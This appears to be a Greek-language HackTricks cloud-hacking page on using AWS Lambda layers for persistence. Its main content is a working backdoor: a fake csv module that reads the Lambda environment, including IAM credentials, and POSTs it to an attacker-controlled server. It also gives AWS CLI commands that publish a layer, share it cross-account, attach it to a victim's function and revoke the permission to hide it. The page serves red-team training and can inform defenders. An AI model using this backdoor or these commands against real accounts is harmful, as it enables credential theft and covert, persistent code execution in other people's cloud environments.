# AWS - Μόνιμη Αντοχή Lambda Layers

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Επίπεδα Lambda

Ένα επίπεδο Lambda είναι ένα αρχείο .zip που **μπορεί να περιέχει επιπλέον κώδικα** ή άλλο περιεχόμενο. Ένα επίπεδο μπορεί να περιέχει βιβλιοθήκες, ένα [προσαρμοσμένο runtime](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), δεδομένα ή αρχεία διαμόρφωσης.

Είναι δυνατόν να συμπεριλάβετε μέχρι **πέντε επίπεδα ανά λειτουργία**. Όταν συμπεριλάβετε ένα επίπεδο σε μια λειτουργία, τα **περιεχόμενα εξάγονται στον κατάλογο `/opt`** στο περιβάλλον εκτέλεσης.

Από **προεπιλογή**, τα **επίπεδα** που δημιουργείτε είναι **ιδιωτικά** για το λογαριασμό AWS σας. Μπορείτε να επιλέξετε να **μοιραστείτε** ένα επίπεδο με άλλους λογαριασμούς ή να **κάνετε** το επίπεδο **δημόσιο**. Αν οι λειτουργίες σας καταναλώνουν ένα επίπεδο που δημοσίευσε διαφορετικός λογαριασμός, οι λειτουργίες σας μποροών να **συνεχίσουν να χρησιμοποιούν την έκδοση του επιπέδου ακόμα και μετά τη διαγραφή του, ή μετά την ανάκληση της άδειάς σας για πρόσβαση στο επίπεδο**. Ωστόσο, δεν μπορείτε να δημιουργήσετε μια νέα λειτουργία ή να ενημερώσετε λειτουργίες χρησιμοποιώντας μια διαγραμμένη έκδοση επιπέδου.

Οι λειτουργίες που αναπτύσσονται ως εικόνα εμφάνισης δεν χρησιμοποιούν επίπεδα. Αντ' αυτού, συσκευάζετε το προτιμώμενο runtime, βιβλιοθήκες και άλλες εξαρτήσεις στην εικόνα εμφάνισης όταν δημιουργείτε την εικόνα.

### Φορτωτική διαδρομή Python

Η διαδρομή φόρτωσης που θα χρησιμοποιήσει το Python στο lambda είναι η ακόλουθη:
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
Ελέγξτε πώς οι **δεύτερη** και τρίτη **θέσεις** καταλαμβάνονται από καταλόγους όπου οι **στρώσεις lambda** αποσυμπιέζουν τα αρχεία τους: **`/opt/python/lib/python3.9/site-packages`** και **`/opt/python`**

{% hint style="danger" %}
Εάν ένας επιτιθέμενος κατάφερε να **τοποθετήσει παρασκηνιακά** ένα χρησιμοποιημένο λειτουργικό **επίπεδο lambda** ή **να προσθέσει ένα** που θα **εκτελεί αυθαίρετο κώδικα όταν φορτώνεται ένα κοινό βιβλιοθήκη**, θα μπορεί να εκτελέσει κακόβουλο κώδικα με κάθε κλήση lambda.
{% endhint %}

Συνεπώς, οι προϋποθέσεις είναι:

* **Έλεγχος βιβλιοθηκών** που **φορτώνονται** από τον κώδικα των θυμάτων
* Δημιουργία μιας **βιβλιοθήκης προξενικής λειτουργίας με στρώσεις lambda** που θα **εκτελεί προσαρμοσμένο κώδικα** και θα **φορτώνει την αρχική** βιβλιοθήκη.

### Προφορτωμένες βιβλιοθήκες

{% hint style="warning" %}
Κατά την κατάχρηση αυτής της τεχνικής αντιμετώπισα μια δυσκολία: Κάποιες βιβλιοθήκες είναι **ήδη φορτωμένες** στο χρόνο εκτέλεσης της python όταν ο κώδικάς σας εκτελείται. Περίμενα να βρω πράγματα όπως `os` ή `sys`, αλλά **ακόμη και η βιβλιοθήκη `json` ήταν φορτωμένη**.\
Για να καταχραστείτε αυτήν την τεχνική διατήρησης, ο κώδικας πρέπει να **φορτώσει μια νέα βιβλιοθήκη που δεν είναι φορτωμένη** όταν εκτελείται ο κώδικας.
{% endhint %}

Με έναν κώδικα python όπως αυτός είναι δυνατόν να αποκτηθεί η **λίστα των βιβλιοθηκών που είναι προφορτωμένες** μέσα στο χρόνο εκτέλεσης της python στη λειτουργία lambda:
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
Και αυτή είναι η **λίστα** (ελέγξτε αν υπάρχουν ήδη βιβλιοθήκες όπως `os` ή `json`)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
Και αυτή είναι η λίστα των **βιβλιοθηκών** που **περιλαμβάνει εγκατεστημένες από προεπιλογή η λάμδα**: [https://gist.github.com/gene1wood/4a052f39490fae00e0c3](https://gist.github.com/gene1wood/4a052f39490fae00e0c3)

### Παραβίαση Επιπέδου Lambda Layer

Σε αυτό το παράδειγμα ας υποθέσουμε ότι ο κωδικός που επιθυμούμε να επιτεθούμε εισάγει το **`csv`**. Θα **παραβιάσουμε την εισαγωγή της βιβλιοθήκης `csv`**.

Για να το πετύχουμε αυτό, θα **δημιουργήσουμε τον φάκελο csv** με το αρχείο **`__init__.py`** μέσα σε ένα διαδρομή που φορτώνεται από τη λάμδα: **`/opt/python/lib/python3.9/site-packages`**\
Στη συνέχεια, όταν εκτελείται η λάμδα και προσπαθεί να φορτώσει το **csv**, το αρχείο μας **`__init__.py` θα φορτωθεί και θα εκτελεστεί**.\
Αυτό το αρχείο πρέπει:

* Να εκτελέσει το payload μας
* Να φορτώσει την αρχική βιβλιοθήκη csv

Μπορούμε να το πετύχουμε αυτό με:
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
Στη συνέχεια, δημιούργησε ένα zip με αυτόν τον κώδικα στη διαδρομή **`python/lib/python3.9/site-packages/__init__.py`** και πρόσθεσέ τον ως ένα lambda layer.

Μπορείς να βρεις αυτόν τον κώδικα στο [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor)

Το ενσωματωμένο payload θα **στείλει τα IAM διαπιστευτήρια σε έναν εξυπηρετητή ΤΗ ΠΡΩΤΗ ΦΟΡΑ που καλείται ή ΜΕΤΑ από έναν επανεκκίνηση του λάμδα container** (αλλαγή κώδικα ή κρύο λάμδα), αλλά **άλλες τεχνικές** όπως η ακόλουθη θα μπορούσαν επίσης να ενσωματωθούν:

{% content-ref url="../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

### Εξωτερικά Layers

Σημείωσε ότι είναι δυνατόν να χρησιμοποιηθούν **lambda layers από εξωτερικούς λογαριασμούς**. Επιπλέον, μια λάμδα μπορεί να χρησιμοποιήσει ένα layer από έναν εξωτερικό λογαριασμό ακόμα κι αν δεν έχει δικαιώματα.\
Επίσης, σημείωσε ότι το **μέγιστο αριθμό layers που μπορεί να έχει μια λάμδα είναι 5**.

Επομένως, για να βελτιώσει την ευελιξία αυτής της τεχνικής ένας επιτιθέμενος θα μπορούσε:

* Να εισάγει ένα backdoor σε έναν υπάρχον layer του χρήστη (τίποτα δεν είναι εξωτερικό)
* **Δημιουργήσει** ένα **layer** στο **λογαριασμό του**, να δώσει πρόσβαση στον **λογαριασμό του θύματος** για να χρησιμοποιήσει το layer, **να διαμορφώσει** το **layer** στη λάμδα του θύματος και **να αφαιρέσει την άδεια**.
* Η **Λάμδα** θα μπορεί ακόμα να **χρησιμοποιήσει το layer** και το **θύμα δεν** θα έχει κάποιον εύκολο τρόπο να **κατεβάσει τον κώδικα των layers** (εκτός από το να πάρει ένα αντίστροφο κέλυφος μέσα στη λάμδα)
* Το θύμα **δεν θα βλέπει εξωτερικά layers** που χρησιμοποιούνται με την εντολή **`aws lambda list-layers`**

{% code overflow="wrap" %}
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
{% endcode %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
{% endhint %}
